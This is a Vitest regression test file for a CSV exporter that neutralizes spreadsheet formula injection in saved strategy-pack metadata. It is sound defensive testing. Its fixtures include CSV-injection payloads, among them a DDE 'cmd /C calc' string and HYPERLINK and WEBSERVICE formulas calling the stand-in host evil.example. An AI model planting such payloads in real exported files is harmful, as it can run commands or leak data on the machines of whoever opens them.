import { describe, expect, it } from "vitest";
import {
  explanationCsvBody,
  explanationCsvField,
  explanationMetadataRows,
} from "./strategyExplanationCsv";

/**
 * CSV-injection regression coverage: untrusted saved-pack metadata (label,
 * author, origin, ...) may start with spreadsheet formula syntax. The
 * serializer must emit such text as literal cells — prefixed with the
 * spreadsheet literal-text marker — instead of letting formula-interpreting
 * consumers treat the field as a formula when the file is opened.
 */

describe("explanationCsvField formula neutralization", () => {
  it("prefixes each formula-leading operator with the literal-text prefix", () => {
    expect(explanationCsvField("=1+1")).toBe("'=1+1");
    expect(explanationCsvField("+1+1")).toBe("'+1+1");
    expect(explanationCsvField("-2+3")).toBe("'-2+3");
    expect(explanationCsvField("@SUM(A1:A2)")).toBe("'@SUM(A1:A2)");
  });

  it("prefixes leading tab, CR, LF or spaces before a formula operator", () => {
    expect(explanationCsvField(" =1+1")).toBe("' =1+1");
    expect(explanationCsvField("\t=cmd|' /C calc")).toBe("'\t=cmd|' /C calc");
    expect(explanationCsvField("\n+1")).toBe("\"'\n+1\"");
    expect(explanationCsvField("\r-2")).toBe("\"'\r-2\"");
    expect(explanationCsvField("\r\n@SUM(A1)")).toBe("\"'\r\n@SUM(A1)\"");
    expect(explanationCsvField(" \t \n+HYPERLINK(\"x\")")).toBe(
      "\"' \t \n+HYPERLINK(\"\"x\"\")\"",
    );
  });

  it("keeps the neutralized prefix inside RFC 4180 quoting for fields that need it", () => {
    // Prefixed value still contains a comma/quote/line break, so RFC 4180
    // quoting wraps the already-prefixed literal text.
    expect(explanationCsvField("=SUM(1,2)")).toBe("\"'=SUM(1,2)\"");
    expect(explanationCsvField('=CMD("a", "b")')).toBe(
      "\"'=CMD(\"\"a\"\", \"\"b\"\")\"",
    );
    expect(explanationCsvField("\r\n-1,5")).toBe("\"'\r\n-1,5\"");
  });

  it("leaves ordinary text, empty fields and operator-free leading whitespace byte-identical", () => {
    expect(explanationCsvField("Trend follow")).toBe("Trend follow");
    expect(explanationCsvField("kraken XBT/USD")).toBe("kraken XBT/USD");
    expect(explanationCsvField("1.0.0")).toBe("1.0.0");
    expect(explanationCsvField("")).toBe("");
    expect(explanationCsvField("   spaced label")).toBe("   spaced label");
    expect(explanationCsvField("\tTabbed label, kept")).toBe(
      '"\tTabbed label, kept"',
    );
    expect(explanationCsvField("sum = a + b")).toBe("sum = a + b");
  });
});

describe("explanationCsvBody keeps formula-leading metadata literal", () => {
  it("exports label/author/origin beginning with formula syntax as literal cells", () => {
    const rows = explanationMetadataRows({
      label: "=HYPERLINK(\"http://evil.example\",\"click\")",
      packId: "trend-follow",
      version: "1.0.0",
      author: "+62|0",
      origin: "@SUM(WEBSERVICE(\"http://evil.example\"))",
    });
    const body = explanationCsvBody(rows);
    const lines = body.split("\r\n");
    expect(lines).toHaveLength(6);
    expect(lines[0]).toBe("section,key,value");
    expect(lines[1]).toBe(
      'metadata,label,"\'=HYPERLINK(""http://evil.example"",""click"")"',
    );
    expect(lines[2]).toBe("metadata,packId,trend-follow");
    expect(lines[3]).toBe("metadata,version,1.0.0");
    expect(lines[4]).toBe("metadata,author,'+62|0");
    expect(lines[5]).toBe(
      'metadata,origin,"\'@SUM(WEBSERVICE(""http://evil.example""))"',
    );
  });

  it("neutralizes metadata whose formula operator only follows leading line breaks", () => {
    const rows = explanationMetadataRows({
      label: "\t=cmd|' /C calc",
      packId: null,
      version: null,
      author: null,
      origin: "\n+1",
    });
    const lines = explanationCsvBody(rows).split("\r\n");
    expect(lines[1]).toBe("metadata,label,'\t=cmd|' /C calc");
    expect(lines[2]).toBe("metadata,packId,");
    expect(lines[5]).toBe('metadata,origin,"\'\n+1"');
  });

  it("keeps ordinary metadata rows byte-identical to the pre-policy export", () => {
    const rows = explanationMetadataRows({
      label: "Trend follow",
      packId: "trend-follow",
      version: "1.0.0",
      author: "krellbot tests",
      origin: "Test fixture.",
    });
    expect(explanationCsvBody(rows)).toBe(
      [
        "section,key,value",
        "metadata,label,Trend follow",
        "metadata,packId,trend-follow",
        "metadata,version,1.0.0",
        "metadata,author,krellbot tests",
        "metadata,origin,Test fixture.",
      ].join("\r\n"),
    );
  });

  it("also neutralizes formula-leading indicator text and market pairs", () => {
    const body = explanationCsvBody([
      { section: "indicator", key: "sma20", value: "=sma(close, 20)" },
      { section: "market", key: "kraken =XBT/USD", value: "=XBT/USD" },
    ]);
    expect(body).toBe(
      [
        "section,key,value",
        'indicator,sma20,"\'=sma(close, 20)"',
        "market,kraken =XBT/USD,'=XBT/USD",
      ].join("\r\n"),
    );
  });
});
